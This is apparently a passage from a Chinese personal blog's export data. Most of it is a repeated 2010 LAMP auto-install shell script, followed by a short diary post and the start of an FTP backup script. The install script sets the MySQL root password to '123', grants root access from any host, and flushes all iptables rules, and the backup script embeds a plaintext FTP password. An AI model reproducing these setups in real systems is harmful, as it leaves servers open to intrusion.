/>ifconfig mybridge|grep &quot;inet addr:&quot;<br />echo -e &quot; 33[31m----------------jiance-------------- 33[0m&quot;<br />exit<br />fi<br />#setup code<br />cd /root/hrjd/<br />printf &quot;Start Auto Install hrjd Server SoftWare&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   33[32m[ok] 33[0mn&quot;<br />printf &quot; 33[32m----------------bridge setuping------------------- 33[0mn&quot;<br />tar zxvf bridge-utils-1.0.6.tar.gz<br />cd bridge-utils-1.0.6<br />printf &quot; 33[32m----------------configure --prefix=/usr------------------- 33[0mn&quot;<br />./configure --prefix=/usr<br />printf &quot; 33[32m----------------make------------------- 33[0mn&quot;<br />make<br />printf &quot; 33[32m----------------make install------------------- 33[0mn&quot;<br />make install<br />printf &quot; 33[32m----------------make done------------------- 33[0mn&quot;<br />cd /etc/sysconfig/network-scripts/<br />if [ -f ifcfg-eth0 ]; then<br />echo &quot;DEVICE=eth0&quot; &gt; ifcfg-eth0<br />echo &quot;ONBOOT=yes&quot; &gt;&gt; ifcfg-eth0<br />echo &quot;TYPE=Ethernet&quot; &gt;&gt; ifcfg-eth0<br />echo &quot;BRIDGE=mybridge&quot; &gt;&gt; ifcfg-eth0<br />echo -e &quot; 33[32mifcfg-eth0 config ok 33[0m&quot;<br />fi<br />if [ -f ifcfg-eth1 ]; then<br />echo &quot;DEVICE=eth1&quot; &gt; ifcfg-eth1<br />echo &quot;ONBOOT=yes&quot; &gt;&gt; ifcfg-eth1<br />echo &quot;TYPE=Ethernet&quot; &gt;&gt; ifcfg-eth1<br />echo &quot;BRIDGE=mybridge&quot; &gt;&gt; ifcfg-eth1<br />echo -e &quot; 33[32mifcfg-eth1 config ok 33[0m&quot;<br />fi<br />if [ -f ifcfg-eth2 ]; then<br />echo &quot;DEVICE=eth2&quot; &gt; ifcfg-eth2<br />echo &quot;ONBOOT=yes&quot; &gt;&gt; ifcfg-eth2<br />echo &quot;TYPE=Ethernet&quot; &gt;&gt; ifcfg-eth2<br />echo &quot;BRIDGE=mybridge&quot; &gt;&gt; ifcfg-eth2<br />echo -e &quot; 33[32mifcfg-eth2 config ok 33[0m&quot;<br />fi<br />if [ -f ifcfg-eth3 ]; then<br />echo &quot;DEVICE=eth3&quot; &gt; ifcfg-eth3<br />echo &quot;ONBOOT=yes&quot; &gt;&gt; ifcfg-eth3<br />echo &quot;TYPE=Ethernet&quot; &gt;&gt; ifcfg-eth3<br />echo &quot;BRIDGE=mybridge&quot; &gt;&gt; ifcfg-eth3<br />echo -e &quot; 33[32mifcfg-eth3 config ok 33[0m&quot;<br />fi<br />if [ -f ifcfg-eth4 ]; then<br />echo &quot;DEVICE=eth4&quot; &gt; ifcfg-eth4<br />echo &quot;ONBOOT=yes&quot; &gt;&gt; ifcfg-eth4<br />echo &quot;TYPE=Ethernet&quot; &gt;&gt; ifcfg-eth4<br />echo &quot;BRIDGE=mybridge&quot; &gt;&gt; ifcfg-eth5<br />echo -e &quot; 33[32mifcfg-eth4 config ok 33[0m&quot;<br />fi<br />if [ -f ifcfg-eth5 ]; then<br />echo &quot;DEVICE=eth5&quot; &gt; ifcfg-eth5<br />echo &quot;ONBOOT=yes&quot; &gt;&gt; ifcfg-eth5<br />echo &quot;TYPE=Ethernet&quot; &gt;&gt; ifcfg-eth5<br />echo &quot;BRIDGE=mybridge&quot; &gt;&gt; ifcfg-eth5<br />echo -e &quot; 33[32mifcfg-eth5 config ok 33[0m&quot;<br />fi<br />echo &quot;DEVICE=mybridge&quot; &gt; ifcfg-mybridge<br />echo &quot;BOOTPROTO=static&quot; &gt;&gt; ifcfg-mybridge<br />echo &quot;ONBOOT=yes&quot; &gt;&gt; ifcfg-mybridge<br />echo &quot;TYPE=Bridge&quot; &gt;&gt; ifcfg-mybridge<br />echo &quot;NETMASK=255.255.255.0&quot; &gt;&gt; ifcfg-mybridge<br />echo &quot;IPADDR=192.168.0.204&quot; &gt;&gt; ifcfg-mybridge<br />echo &quot;GATEWAY=192.168.0.1&quot; &gt;&gt; ifcfg-mybridge<br />echo &quot;STP=on&quot; &gt;&gt; ifcfg-mybridge<br />if [ -f ifcfg-mybridge ]; then<br />echo -e &quot; 33[32mifcfg-mybridge config ok 33[0m&quot;<br />fi<br />printf &quot; 33[32m----------------bridge Done------------------- 33[0mn&quot;<br />cd /root/hrjd<br />printf &quot; 33[32m----------------MySql Setup------------------- 33[0mn&quot;<br />cp my.cnf /etc/my.cnf<br />rpm -ivh mysql-client-5.0.22-0.i386.rpm<br />sleep 1<br />rpm -ivh mysql-devel-5.0.22-0.i386.rpm<br />sleep 1<br />rpm -ivh mysql-shared-5.0.22-0.i386.rpm<br />sleep 1<br />rpm -ivh mysql-server-5.0.22-0.i386.rpm<br />ps aux|grep mysql|grep -v grep &gt; test1<br />if [ -s test1 ];then<br />echo -e &quot; 33[32m----mysql runing ok---- 33[0mn&quot;<br />mysqladmin -u root password 123<br />mysql -uroot -p123 -e &quot;grant all on *.* to <a>'root'@'%'</a> identified by '123'&quot;<br />mysql -uroot -p123 -e &quot;flush privileges&quot;<br />iptables -F<br />rm -r test1<br />echo -e &quot; 33[32m----------------MySql Setup Done-------------- 33[0mn&quot;<br />else<br />echo -e &quot; 33[31m----mysql no runing---- 33[0mn&quot;<br />echo -e &quot; 33[31m----mysql Setup error&quot;<br />fi<br />printf &quot; 33[32m---------------Apache Setup------------------- 33[0mn&quot;<br />tar zxvf httpd-2.2.9.tar.gz<br />cd httpd-2.2.9<br />printf &quot; 33[32m------------Apache ./config------------------- 33[0mn&quot;<br />./configure --prefix=/usr/local/apache2 --enable-so -enable-rewrite<br />printf &quot; 33[32m----------------Apache make------------------- 33[0mn&quot;<br />make<br />printf &quot; 33[32m----------Apache make install----------------- 33[0mn&quot;<br />make install<br />cd /root/hrjd<br />cp -a ruqinjiance/ /usr/local/apache2/htdocs/<br />mv /usr/local/apache2/conf/httpd.conf /usr/local/apache2/conf/httpd.conf.bak<br />cp -a httpd.conf /usr/local/apache2/conf/httpd.conf<br />printf &quot; 33[32m-------------Apache Setup Done---------------- 33[0mn&quot;<br />printf &quot; 33[32m-----------------PHP Setup-------------------- 33[0mn&quot;<br />tar zxvf php-5.2.11.tar.gz<br />cd php-5.2.11<br />printf &quot; 33[32m----------------PHP ./config ----------------- 33[0mn&quot;<br />./configure --prefix=/usr/local/php5 --with-apxs2=/usr/local/apache2/bin/apxs --with-mysql=/usr/bin/mysql --with-config-file-path=/usr/local/apache2/conf --enable-sockets<br />make<br />make install<br />cd /root/hrjd<br />mv /usr/local/php5/php.ini /usr/local/php5/php.ini.bak<br />cp php.ini /usr/local/php5/php.ini<br />printf &quot; 33[32m----------------PHP Setup Done----------------- 33[0mn&quot;<br />printf &quot; 33[32m---------------HRJD SERVER Setup--------------- 33[0mn&quot;<br />cp /root/hrjd/hrjd.tar /usr/hrjd.tar<br />cd /usr<br />tar xvf hrjd.tar<br />cd /root/hrjd<br />chmod 755 rc.local<br />mv /etc/rc.d/rc.local /etc/rc.d/rc.local.bak<br />cp /root/hrjd/rc.local /etc/rc.d/rc.local<br />ls /dev/|grep hda &gt; test1<br />if [ -s test1 ];then<br />echo -e &quot; 33[32m------------IDE HD ID--------------&quot;<br />hdparm -i /dev/hda|grep SerialNo <br />echo -e &quot;------------IDE HD ID-------------- 33[0m&quot;<br />rm -rf test1<br />else<br />chmod 777 sata<br />echo -e &quot; 33[32m------------SAST HD ID--------------&quot;<br />./sata<br />echo -e &quot;------------SAST HD ID-------------- 33[0m&quot;<br />fi<br />printf &quot;HRJD Server setup ok&quot;<br />getchar() {<br />&nbsp;&nbsp;&nbsp;  stty cbreak -echo<br />&nbsp;&nbsp;&nbsp;  dd if=/dev/tty bs=1 count=1\n2&gt; /dev/null<br />&nbsp;&nbsp;&nbsp;  stty -cbreak echo<br />}<br />printf &quot; 33[32m-----------------press any key reboot----------------- 33[0m&quot;<br />ret=`getchar`<br />echo<br />reboot</p><p>&lt;/code&gt;</p>","slug":"自动安装脚本","published":1,"updated":"2023-04-22T05:38:45.145Z","_id":"clgrjlxmq00cq7opi44d91bbl","comments":1,"layout":"post","photos":[],"link":"","content":"<p>LAMP自动安装脚本,为工作的时候，天天敲命令，autoinstall。</p><p>很垃圾的、没有什么华丽的语言、N年后，看看自己写的，能笑什么样、</p><p>安装程序就不拿出来了、代码如下：</p><p> </p><p>&lt;code&gt;</p><p> </p><p>#!/bin/sh</p><p>#autoinstall 自动安装脚本<br />#本脚本用于hrjd server安装使用<br />#跑去文档，傻瓜式安装。<br />#没有自动判断文件功能<br />#应该遵循文件名称，不然报错<br />#注意错误提示，及时排错<br />#所有安装文件必须放在/root/hrjd下面</p><p>#2010.10.09 by:key1088</p><p>#jiance code<br />ls /usr/cis7|grep server &gt; test1<br />ps aux|grep httpd|grep -v grep &gt;&gt; test1<br />if [ -s test1 ];then<br />rm -f test1<br />echo -e &quot; 33[31m----------------jiance-------------- 33[0m&quot;<br />echo -e &quot; 33[33m------server----- 33[0m&quot;<br />ps aux|grep server|grep -v grep<br />echo -e &quot; 33[33m------lowlessip----- 33[0m&quot;<br />ps aux|grep lowlessip|grep -v grep <br />echo -e &quot; 33[33m------guard----- 33[0m&quot;<br />ps aux|grep guard|grep -v grep<br />echo -e &quot; 33[33m------httpd port----- 33[0m&quot;<br />netstat -an|grep :80<br />echo -e &quot; 33[33m------mysql port----- 33[0m&quot;<br />netstat -an|grep :3306<br />echo -e &quot; 33[33m------mode----- 33[0m&quot;<br />lsmod |grep blackwhite<br />echo -e &quot; 33[33m------mybridge----- 33[0m&quot;<br />ifconfig mybridge|grep &quot;inet addr:&quot;<br />echo -e &quot; 33[31m----------------jiance-------------- 33[0m&quot;<br />exit<br />fi<br />#setup code<br />cd /root/hrjd/<br />printf &quot;Start Auto Install hrjd Server SoftWare&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   33[32m[ok] 33[0mn&quot;<br />printf &quot; 33[32m----------------bridge setuping------------------- 33[0mn&quot;<br />tar zxvf bridge-utils-1.0.6.tar.gz<br />cd bridge-utils-1.0.6<br />printf &quot; 33[32m----------------configure --prefix=/usr------------------- 33[0mn&quot;<br />./configure --prefix=/usr<br />printf &quot; 33[32m----------------make------------------- 33[0mn&quot;<br />make<br />printf &quot; 33[32m----------------make install------------------- 33[0mn&quot;<br />make install<br />printf &quot; 33[32m----------------make done------------------- 33[0mn&quot;<br />cd /etc/sysconfig/network-scripts/<br />if [ -f ifcfg-eth0 ]; then<br />echo &quot;DEVICE=eth0&quot; &gt; ifcfg-eth0<br />echo &quot;ONBOOT=yes&quot; &gt;&gt; ifcfg-eth0<br />echo &quot;TYPE=Ethernet&quot; &gt;&gt; ifcfg-eth0<br />echo &quot;BRIDGE=mybridge&quot; &gt;&gt; ifcfg-eth0<br />echo -e &quot; 33[32mifcfg-eth0 config ok 33[0m&quot;<br />fi<br />if [ -f ifcfg-eth1 ]; then<br />echo &quot;DEVICE=eth1&quot; &gt; ifcfg-eth1<br />echo &quot;ONBOOT=yes&quot; &gt;&gt; ifcfg-eth1<br />echo &quot;TYPE=Ethernet&quot; &gt;&gt; ifcfg-eth1<br />echo &quot;BRIDGE=mybridge&quot; &gt;&gt; ifcfg-eth1<br />echo -e &quot; 33[32mifcfg-eth1 config ok 33[0m&quot;<br />fi<br />if [ -f ifcfg-eth2 ]; then<br />echo &quot;DEVICE=eth2&quot; &gt; ifcfg-eth2<br />echo &quot;ONBOOT=yes&quot; &gt;&gt; ifcfg-eth2<br />echo &quot;TYPE=Ethernet&quot; &gt;&gt; ifcfg-eth2<br />echo &quot;BRIDGE=mybridge&quot; &gt;&gt; ifcfg-eth2<br />echo -e &quot; 33[32mifcfg-eth2 config ok 33[0m&quot;<br />fi<br />if [ -f ifcfg-eth3 ]; then<br />echo &quot;DEVICE=eth3&quot; &gt; ifcfg-eth3<br />echo &quot;ONBOOT=yes&quot; &gt;&gt; ifcfg-eth3<br />echo &quot;TYPE=Ethernet&quot; &gt;&gt; ifcfg-eth3<br />echo &quot;BRIDGE=mybridge&quot; &gt;&gt; ifcfg-eth3<br />echo -e &quot; 33[32mifcfg-eth3 config ok 33[0m&quot;<br />fi<br />if [ -f ifcfg-eth4 ]; then<br />echo &quot;DEVICE=eth4&quot; &gt; ifcfg-eth4<br />echo &quot;ONBOOT=yes&quot; &gt;&gt; ifcfg-eth4<br />echo &quot;TYPE=Ethernet&quot; &gt;&gt; ifcfg-eth4<br />echo &quot;BRIDGE=mybridge&quot; &gt;&gt; ifcfg-eth5<br />echo -e &quot; 33[32mifcfg-eth4 config ok 33[0m&quot;<br />fi<br />if [ -f ifcfg-eth5 ]; then<br />echo &quot;DEVICE=eth5&quot; &gt; ifcfg-eth5<br />echo &quot;ONBOOT=yes&quot; &gt;&gt; ifcfg-eth5<br />echo &quot;TYPE=Ethernet&quot; &gt;&gt; ifcfg-eth5<br />echo &quot;BRIDGE=mybridge&quot; &gt;&gt; ifcfg-eth5<br />echo -e &quot; 33[32mifcfg-eth5 config ok 33[0m&quot;<br />fi<br />echo &quot;DEVICE=mybridge&quot; &gt; ifcfg-mybridge<br />echo &quot;BOOTPROTO=static&quot; &gt;&gt; ifcfg-mybridge<br />echo &quot;ONBOOT=yes&quot; &gt;&gt; ifcfg-mybridge<br />echo &quot;TYPE=Bridge&quot; &gt;&gt; ifcfg-mybridge<br />echo &quot;NETMASK=255.255.255.0&quot; &gt;&gt; ifcfg-mybridge<br />echo &quot;IPADDR=192.168.0.204&quot; &gt;&gt; ifcfg-mybridge<br />echo &quot;GATEWAY=192.168.0.1&quot; &gt;&gt; ifcfg-mybridge<br />echo &quot;STP=on&quot; &gt;&gt; ifcfg-mybridge<br />if [ -f ifcfg-mybridge ]; then<br />echo -e &quot; 33[32mifcfg-mybridge config ok 33[0m&quot;<br />fi<br />printf &quot; 33[32m----------------bridge Done------------------- 33[0mn&quot;<br />cd /root/hrjd<br />printf &quot; 33[32m----------------MySql Setup------------------- 33[0mn&quot;<br />cp my.cnf /etc/my.cnf<br />rpm -ivh mysql-client-5.0.22-0.i386.rpm<br />sleep 1<br />rpm -ivh mysql-devel-5.0.22-0.i386.rpm<br />sleep 1<br />rpm -ivh mysql-shared-5.0.22-0.i386.rpm<br />sleep 1<br />rpm -ivh mysql-server-5.0.22-0.i386.rpm<br />ps aux|grep mysql|grep -v grep &gt; test1<br />if [ -s test1 ];then<br />echo -e &quot; 33[32m----mysql runing ok---- 33[0mn&quot;<br />mysqladmin -u root password 123<br />mysql -uroot -p123 -e &quot;grant all on *.* to <a>'root'@'%'</a> identified by '123'&quot;<br />mysql -uroot -p123 -e &quot;flush privileges&quot;<br />iptables -F<br />rm -r test1<br />echo -e &quot; 33[32m----------------MySql Setup Done-------------- 33[0mn&quot;<br />else<br />echo -e &quot; 33[31m----mysql no runing---- 33[0mn&quot;<br />echo -e &quot; 33[31m----mysql Setup error&quot;<br />fi<br />printf &quot; 33[32m---------------Apache Setup------------------- 33[0mn&quot;<br />tar zxvf httpd-2.2.9.tar.gz<br />cd httpd-2.2.9<br />printf &quot; 33[32m------------Apache ./config------------------- 33[0mn&quot;<br />./configure --prefix=/usr/local/apache2 --enable-so -enable-rewrite<br />printf &quot; 33[32m----------------Apache make------------------- 33[0mn&quot;<br />make<br />printf &quot; 33[32m----------Apache make install----------------- 33[0mn&quot;<br />make install<br />cd /root/hrjd<br />cp -a ruqinjiance/ /usr/local/apache2/htdocs/<br />mv /usr/local/apache2/conf/httpd.conf /usr/local/apache2/conf/httpd.conf.bak<br />cp -a httpd.conf /usr/local/apache2/conf/httpd.conf<br />printf &quot; 33[32m-------------Apache Setup Done---------------- 33[0mn&quot;<br />printf &quot; 33[32m-----------------PHP Setup-------------------- 33[0mn&quot;<br />tar zxvf php-5.2.11.tar.gz<br />cd php-5.2.11<br />printf &quot; 33[32m----------------PHP ./config ----------------- 33[0mn&quot;<br />./configure --prefix=/usr/local/php5 --with-apxs2=/usr/local/apache2/bin/apxs --with-mysql=/usr/bin/mysql --with-config-file-path=/usr/local/apache2/conf --enable-sockets<br />make<br />make install<br />cd /root/hrjd<br />mv /usr/local/php5/php.ini /usr/local/php5/php.ini.bak<br />cp php.ini /usr/local/php5/php.ini<br />printf &quot; 33[32m----------------PHP Setup Done----------------- 33[0mn&quot;<br />printf &quot; 33[32m---------------HRJD SERVER Setup--------------- 33[0mn&quot;<br />cp /root/hrjd/hrjd.tar /usr/hrjd.tar<br />cd /usr<br />tar xvf hrjd.tar<br />cd /root/hrjd<br />chmod 755 rc.local<br />mv /etc/rc.d/rc.local /etc/rc.d/rc.local.bak<br />cp /root/hrjd/rc.local /etc/rc.d/rc.local<br />ls /dev/|grep hda &gt; test1<br />if [ -s test1 ];then<br />echo -e &quot; 33[32m------------IDE HD ID--------------&quot;<br />hdparm -i /dev/hda|grep SerialNo <br />echo -e &quot;------------IDE HD ID-------------- 33[0m&quot;<br />rm -rf test1<br />else<br />chmod 777 sata<br />echo -e &quot; 33[32m------------SAST HD ID--------------&quot;<br />./sata<br />echo -e &quot;------------SAST HD ID-------------- 33[0m&quot;<br />fi<br />printf &quot;HRJD Server setup ok&quot;<br />getchar() {<br />&nbsp;&nbsp;&nbsp;  stty cbreak -echo<br />&nbsp;&nbsp;&nbsp;  dd if=/dev/tty bs=1 count=1\n2&gt; /dev/null<br />&nbsp;&nbsp;&nbsp;  stty -cbreak echo<br />}<br />printf &quot; 33[32m-----------------press any key reboot----------------- 33[0m&quot;<br />ret=`getchar`<br />echo<br />reboot</p><p>&lt;/code&gt;</p>","site":{"data":{}},"excerpt":"","more":"<p>LAMP自动安装脚本,为工作的时候，天天敲命令，autoinstall。</p><p>很垃圾的、没有什么华丽的语言、N年后，看看自己写的，能笑什么样、</p><p>安装程序就不拿出来了、代码如下：</p><p> </p><p>&lt;code&gt;</p><p> </p><p>#!/bin/sh</p><p>#autoinstall 自动安装脚本<br />#本脚本用于hrjd server安装使用<br />#跑去文档，傻瓜式安装。<br />#没有自动判断文件功能<br />#应该遵循文件名称，不然报错<br />#注意错误提示，及时排错<br />#所有安装文件必须放在/root/hrjd下面</p><p>#2010.10.09 by:key1088</p><p>#jiance code<br />ls /usr/cis7|grep server &gt; test1<br />ps aux|grep httpd|grep -v grep &gt;&gt; test1<br />if [ -s test1 ];then<br />rm -f test1<br />echo -e &quot; 33[31m----------------jiance-------------- 33[0m&quot;<br />echo -e &quot; 33[33m------server----- 33[0m&quot;<br />ps aux|grep server|grep -v grep<br />echo -e &quot; 33[33m------lowlessip----- 33[0m&quot;<br />ps aux|grep lowlessip|grep -v grep <br />echo -e &quot; 33[33m------guard----- 33[0m&quot;<br />ps aux|grep guard|grep -v grep<br />echo -e &quot; 33[33m------httpd port----- 33[0m&quot;<br />netstat -an|grep :80<br />echo -e &quot; 33[33m------mysql port----- 33[0m&quot;<br />netstat -an|grep :3306<br />echo -e &quot; 33[33m------mode----- 33[0m&quot;<br />lsmod |grep blackwhite<br />echo -e &quot; 33[33m------mybridge----- 33[0m&quot;<br />ifconfig mybridge|grep &quot;inet addr:&quot;<br />echo -e &quot; 33[31m----------------jiance-------------- 33[0m&quot;<br />exit<br />fi<br />#setup code<br />cd /root/hrjd/<br />printf &quot;Start Auto Install hrjd Server SoftWare&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;   33[32m[ok] 33[0mn&quot;<br />printf &quot; 33[32m----------------bridge setuping------------------- 33[0mn&quot;<br />tar zxvf bridge-utils-1.0.6.tar.gz<br />cd bridge-utils-1.0.6<br />printf &quot; 33[32m----------------configure --prefix=/usr------------------- 33[0mn&quot;<br />./configure --prefix=/usr<br />printf &quot; 33[32m----------------make------------------- 33[0mn&quot;<br />make<br />printf &quot; 33[32m----------------make install------------------- 33[0mn&quot;<br />make install<br />printf &quot; 33[32m----------------make done------------------- 33[0mn&quot;<br />cd /etc/sysconfig/network-scripts/<br />if [ -f ifcfg-eth0 ]; then<br />echo &quot;DEVICE=eth0&quot; &gt; ifcfg-eth0<br />echo &quot;ONBOOT=yes&quot; &gt;&gt; ifcfg-eth0<br />echo &quot;TYPE=Ethernet&quot; &gt;&gt; ifcfg-eth0<br />echo &quot;BRIDGE=mybridge&quot; &gt;&gt; ifcfg-eth0<br />echo -e &quot; 33[32mifcfg-eth0 config ok 33[0m&quot;<br />fi<br />if [ -f ifcfg-eth1 ]; then<br />echo &quot;DEVICE=eth1&quot; &gt; ifcfg-eth1<br />echo &quot;ONBOOT=yes&quot; &gt;&gt; ifcfg-eth1<br />echo &quot;TYPE=Ethernet&quot; &gt;&gt; ifcfg-eth1<br />echo &quot;BRIDGE=mybridge&quot; &gt;&gt; ifcfg-eth1<br />echo -e &quot; 33[32mifcfg-eth1 config ok 33[0m&quot;<br />fi<br />if [ -f ifcfg-eth2 ]; then<br />echo &quot;DEVICE=eth2&quot; &gt; ifcfg-eth2<br />echo &quot;ONBOOT=yes&quot; &gt;&gt; ifcfg-eth2<br />echo &quot;TYPE=Ethernet&quot; &gt;&gt; ifcfg-eth2<br />echo &quot;BRIDGE=mybridge&quot; &gt;&gt; ifcfg-eth2<br />echo -e &quot; 33[32mifcfg-eth2 config ok 33[0m&quot;<br />fi<br />if [ -f ifcfg-eth3 ]; then<br />echo &quot;DEVICE=eth3&quot; &gt; ifcfg-eth3<br />echo &quot;ONBOOT=yes&quot; &gt;&gt; ifcfg-eth3<br />echo &quot;TYPE=Ethernet&quot; &gt;&gt; ifcfg-eth3<br />echo &quot;BRIDGE=mybridge&quot; &gt;&gt; ifcfg-eth3<br />echo -e &quot; 33[32mifcfg-eth3 config ok 33[0m&quot;<br />fi<br />if [ -f ifcfg-eth4 ]; then<br />echo &quot;DEVICE=eth4&quot; &gt; ifcfg-eth4<br />echo &quot;ONBOOT=yes&quot; &gt;&gt; ifcfg-eth4<br />echo &quot;TYPE=Ethernet&quot; &gt;&gt; ifcfg-eth4<br />echo &quot;BRIDGE=mybridge&quot; &gt;&gt; ifcfg-eth5<br />echo -e &quot; 33[32mifcfg-eth4 config ok 33[0m&quot;<br />fi<br />if [ -f ifcfg-eth5 ]; then<br />echo &quot;DEVICE=eth5&quot; &gt; ifcfg-eth5<br />echo &quot;ONBOOT=yes&quot; &gt;&gt; ifcfg-eth5<br />echo &quot;TYPE=Ethernet&quot; &gt;&gt; ifcfg-eth5<br />echo &quot;BRIDGE=mybridge&quot; &gt;&gt; ifcfg-eth5<br />echo -e &quot; 33[32mifcfg-eth5 config ok 33[0m&quot;<br />fi<br />echo &quot;DEVICE=mybridge&quot; &gt; ifcfg-mybridge<br />echo &quot;BOOTPROTO=static&quot; &gt;&gt; ifcfg-mybridge<br />echo &quot;ONBOOT=yes&quot; &gt;&gt; ifcfg-mybridge<br />echo &quot;TYPE=Bridge&quot; &gt;&gt; ifcfg-mybridge<br />echo &quot;NETMASK=255.255.255.0&quot; &gt;&gt; ifcfg-mybridge<br />echo &quot;IPADDR=192.168.0.204&quot; &gt;&gt; ifcfg-mybridge<br />echo &quot;GATEWAY=192.168.0.1&quot; &gt;&gt; ifcfg-mybridge<br />echo &quot;STP=on&quot; &gt;&gt; ifcfg-mybridge<br />if [ -f ifcfg-mybridge ]; then<br />echo -e &quot; 33[32mifcfg-mybridge config ok 33[0m&quot;<br />fi<br />printf &quot; 33[32m----------------bridge Done------------------- 33[0mn&quot;<br />cd /root/hrjd<br />printf &quot; 33[32m----------------MySql Setup------------------- 33[0mn&quot;<br />cp my.cnf /etc/my.cnf<br />rpm -ivh mysql-client-5.0.22-0.i386.rpm<br />sleep 1<br />rpm -ivh mysql-devel-5.0.22-0.i386.rpm<br />sleep 1<br />rpm -ivh mysql-shared-5.0.22-0.i386.rpm<br />sleep 1<br />rpm -ivh mysql-server-5.0.22-0.i386.rpm<br />ps aux|grep mysql|grep -v grep &gt; test1<br />if [ -s test1 ];then<br />echo -e &quot; 33[32m----mysql runing ok---- 33[0mn&quot;<br />mysqladmin -u root password 123<br />mysql -uroot -p123 -e &quot;grant all on *.* to <a>'root'@'%'</a> identified by '123'&quot;<br />mysql -uroot -p123 -e &quot;flush privileges&quot;<br />iptables -F<br />rm -r test1<br />echo -e &quot; 33[32m----------------MySql Setup Done-------------- 33[0mn&quot;<br />else<br />echo -e &quot; 33[31m----mysql no runing---- 33[0mn&quot;<br />echo -e &quot; 33[31m----mysql Setup error&quot;<br />fi<br />printf &quot; 33[32m---------------Apache Setup------------------- 33[0mn&quot;<br />tar zxvf httpd-2.2.9.tar.gz<br />cd httpd-2.2.9<br />printf &quot; 33[32m------------Apache ./config------------------- 33[0mn&quot;<br />./configure --prefix=/usr/local/apache2 --enable-so -enable-rewrite<br />printf &quot; 33[32m----------------Apache make------------------- 33[0mn&quot;<br />make<br />printf &quot; 33[32m----------Apache make install----------------- 33[0mn&quot;<br />make install<br />cd /root/hrjd<br />cp -a ruqinjiance/ /usr/local/apache2/htdocs/<br />mv /usr/local/apache2/conf/httpd.conf /usr/local/apache2/conf/httpd.conf.bak<br />cp -a httpd.conf /usr/local/apache2/conf/httpd.conf<br />printf &quot; 33[32m-------------Apache Setup Done---------------- 33[0mn&quot;<br />printf &quot; 33[32m-----------------PHP Setup-------------------- 33[0mn&quot;<br />tar zxvf php-5.2.11.tar.gz<br />cd php-5.2.11<br />printf &quot; 33[32m----------------PHP ./config ----------------- 33[0mn&quot;<br />./configure --prefix=/usr/local/php5 --with-apxs2=/usr/local/apache2/bin/apxs --with-mysql=/usr/bin/mysql --with-config-file-path=/usr/local/apache2/conf --enable-sockets<br />make<br />make install<br />cd /root/hrjd<br />mv /usr/local/php5/php.ini /usr/local/php5/php.ini.bak<br />cp php.ini /usr/local/php5/php.ini<br />printf &quot; 33[32m----------------PHP Setup Done----------------- 33[0mn&quot;<br />printf &quot; 33[32m---------------HRJD SERVER Setup--------------- 33[0mn&quot;<br />cp /root/hrjd/hrjd.tar /usr/hrjd.tar<br />cd /usr<br />tar xvf hrjd.tar<br />cd /root/hrjd<br />chmod 755 rc.local<br />mv /etc/rc.d/rc.local /etc/rc.d/rc.local.bak<br />cp /root/hrjd/rc.local /etc/rc.d/rc.local<br />ls /dev/|grep hda &gt; test1<br />if [ -s test1 ];then<br />echo -e &quot; 33[32m------------IDE HD ID--------------&quot;<br />hdparm -i /dev/hda|grep SerialNo <br />echo -e &quot;------------IDE HD ID-------------- 33[0m&quot;<br />rm -rf test1<br />else<br />chmod 777 sata<br />echo -e &quot; 33[32m------------SAST HD ID--------------&quot;<br />./sata<br />echo -e &quot;------------SAST HD ID-------------- 33[0m&quot;<br />fi<br />printf &quot;HRJD Server setup ok&quot;<br />getchar() {<br />&nbsp;&nbsp;&nbsp;  stty cbreak -echo<br />&nbsp;&nbsp;&nbsp;  dd if=/dev/tty bs=1 count=1\n2&gt; /dev/null<br />&nbsp;&nbsp;&nbsp;  stty -cbreak echo<br />}<br />printf &quot; 33[32m-----------------press any key reboot----------------- 33[0m&quot;<br />ret=`getchar`<br />echo<br />reboot</p><p>&lt;/code&gt;</p>"},{"title":"郁闷，手机停机了。","date":"2010-03-29T00:37:00.000Z","_content":"昨天晚上，查询包月短信，现在没有太多“业务”了，还有30多条短信呢，可怜啊。<br />这不快到月底了嘛，来几个群发，想亲友们，问问好，送送祝福，不是每次短信发不完，才给他们发的，一般都是直接打电话的。<br />晚上都没有睡好，陆陆续续的来短信，也不看，太困了。<br />早上看信息报告，我晕40多条，发超了，还要一个个回。回了没有几个人时，发现发送消息失败。<br />⊙﹏⊙b汗，竟然停机了。。<br />","source":"_posts/郁闷，手机停机了。.md","raw":"title: 郁闷，手机停机了。\ncategories: [生活感想]\ntags: []\ndate: 2010-03-29 08:37:00\n---\n昨天晚上，查询包月短信，现在没有太多“业务”了，还有30多条短信呢，可怜啊。<br />这不快到月底了嘛，来几个群发，想亲友们，问问好，送送祝福，不是每次短信发不完，才给他们发的，一般都是直接打电话的。<br />晚上都没有睡好，陆陆续续的来短信，也不看，太困了。<br />早上看信息报告，我晕40多条，发超了，还要一个个回。回了没有几个人时，发现发送消息失败。<br />⊙﹏⊙b汗，竟然停机了。。<br />","slug":"郁闷，手机停机了。","published":1,"updated":"2023-04-22T05:38:45.163Z","_id":"clgrjlxms00cr7opi4nq8f8jy","comments":1,"layout":"post","photos":[],"link":"","content":"<p>昨天晚上，查询包月短信，现在没有太多“业务”了，还有30多条短信呢，可怜啊。<br />这不快到月底了嘛，来几个群发，想亲友们，问问好，送送祝福，不是每次短信发不完，才给他们发的，一般都是直接打电话的。<br />晚上都没有睡好，陆陆续续的来短信，也不看，太困了。<br />早上看信息报告，我晕40多条，发超了，还要一个个回。回了没有几个人时，发现发送消息失败。<br />⊙﹏⊙b汗，竟然停机了。。<br /></p>\n","site":{"data":{}},"excerpt":"","more":"<p>昨天晚上，查询包月短信，现在没有太多“业务”了，还有30多条短信呢，可怜啊。<br />这不快到月底了嘛，来几个群发，想亲友们，问问好，送送祝福，不是每次短信发不完，才给他们发的，一般都是直接打电话的。<br />晚上都没有睡好，陆陆续续的来短信，也不看，太困了。<br />早上看信息报告，我晕40多条，发超了，还要一个个回。回了没有几个人时，发现发送消息失败。<br />⊙﹏⊙b汗，竟然停机了。。<br /></p>\n"},{"title":"自动备份上传ftp服务器","date":"2011-10-18T07:12:00.000Z","_content":"#!/bin/bash\nfilename=`date +%Y%m%d`.tar                                                         #文件名称为日期\nfind /data/ -mtime +30 | xargs tar -cf $filename                                 #在/data目录中，查找30天内没有修改的文件，并打包\ngzip -9 $filename                                                                              #使用gzip压缩\nftp -n &lt;&lt; EOF                                                                                   #交互登录\nopen 192.168.0.1\nuser key1088 123456                                                                       #key1088 为username，123456为password\nput /data/$filename.gz bakfile/$filename.gz                                      #上传到bakfile文件下面\nbye\nEOF\nrm 